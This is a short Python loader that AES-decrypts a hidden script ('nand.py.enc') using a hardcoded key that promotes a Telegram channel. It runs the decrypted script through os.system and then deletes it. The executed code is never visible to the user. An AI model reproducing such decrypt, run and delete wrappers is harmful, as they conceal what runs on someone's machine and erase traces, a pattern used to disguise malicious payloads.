from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64
import os

# Key used for encryption
encryption_key = "Join - @creativeydv Channel ON TG".encode('utf-8')

# Path to the encrypted file
encrypted_file_path = 'nand.py.enc'

# Read the encrypted file content
with open(encrypted_file_path, 'rb') as f:
    encrypted_data = base64.b64decode(f.read())

    # Prepare decryption
    cipher = AES.new(encryption_key[:16], AES.MODE_ECB)  # Same key for decryption
    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)

    # Save the decrypted content temporarily as a Python file
    decrypted_file_path = 'nand.py'
    with open(decrypted_file_path, 'wb') as f_decrypted:
        f_decrypted.write(decrypted_data)

        # Run the decrypted script
        os.system(f'python {decrypted_file_path}')

        # Clean up by removing the temporary decrypted file
        os.remove(decrypted_file_path)
